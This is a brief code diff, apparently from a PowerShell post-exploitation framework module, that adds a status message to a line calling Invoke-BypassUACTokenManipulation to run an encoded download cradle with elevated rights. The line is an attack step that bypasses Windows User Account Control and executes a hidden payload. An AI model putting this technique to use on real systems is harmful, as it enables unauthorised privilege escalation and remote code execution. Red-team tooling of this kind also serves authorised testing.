@@ -51,7 +51,7 @@ class Module:
             pass
 
         script_end = (
-            f'Invoke-BypassUACTokenManipulation -Arguments "-w 1 -enc {encoded_cradle}"'
+            f'Invoke-BypassUACTokenManipulation -Arguments "-w 1 -enc {encoded_cradle}"; "Invoke-BypassUACTokenManipulation completed"'
         )
 
         return main_menu.modulesv2.finalize_module(
